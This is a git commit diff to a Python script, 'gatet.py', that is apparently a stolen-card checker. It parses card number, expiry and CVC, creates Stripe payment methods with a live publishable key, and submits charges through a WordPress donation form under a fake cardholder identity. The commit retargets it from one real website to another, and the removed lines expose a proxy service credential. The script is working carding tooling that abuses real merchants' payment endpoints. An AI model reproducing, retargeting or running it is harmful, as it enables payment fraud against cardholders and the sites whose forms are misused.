d04b7eb0a39ab4600faa65446bc6eaeb9e87f535
Rodamuser08 <rodamuser08@gmail.com>
2025-07-04 09:41:15 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -1,10 +1,6 @@
 import requests,re
 import random
-from proxy import reqproxy, make_request
 def Tele(ccx):
-	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
-	session, ip = reqproxy(proxy_str)
-	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -33,19 +29,19 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Ffb705f34aa%3B+stripe-js-v3%2Ffb705f34aa%3B+card-element&key=pk_live_51Htc78EWFvJhVVegTITTsLS0bGqqbu0gOSJdWifr2kxWX8mkJNNZmcOuRDWBk6ZYNWB2u92PatJXwwm4ZUi8l7qt00vUozeEge'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F155bc2c263%3B+stripe-js-v3%2F155bc2c263%3B+card-element&key=pk_live_51K6NoPGdie3QtZtYTPVL04kG3KaCqziqWzmChR5GrvLldqfHJQwhadsifZwlw7eEVSOjzqYhHs0WAKBXiK5QMAM300alarMxbt'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'ilfmedia.com',
+	    'authority': 'www.monarchcareuk.com',
 	    'accept': 'application/json, text/javascript, */*; q=0.01',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://ilfmedia.com',
-	    'referer': 'https://ilfmedia.com/webb-donate/',
+	    'origin': 'https://www.monarchcareuk.com',
+	    'referer': 'https://www.monarchcareuk.com/payments/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -58,17 +54,19 @@ def Tele(ccx):
 	
 	data = {
 	    'action': 'wp_full_stripe_inline_donation_charge',
-	    'wpfs-form-name': 'Webbs_Live_Stream',
+	    'wpfs-form-name': 'MonarchCarePayment',
 	    'wpfs-form-get-parameters': '%7B%7D',
 	    'wpfs-custom-amount': 'other',
 	    'wpfs-custom-amount-unique': '1',
 	    'wpfs-donation-frequency': 'one-time',
+	    'wpfs-custom-input[]': '1',
 	    'wpfs-card-holder-email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
 	    'wpfs-card-holder-name': 'Rodam User',
+	    'wpfs-terms-of-use-accepted': '1',
 	    'wpfs-stripe-payment-method-id': pm,
 	}
 	
-	response = requests.post('https://ilfmedia.com/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = requests.post('https://www.monarchcareuk.com/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	result = re.search('"message":"(.*?)"', response.text).group(1)
 		
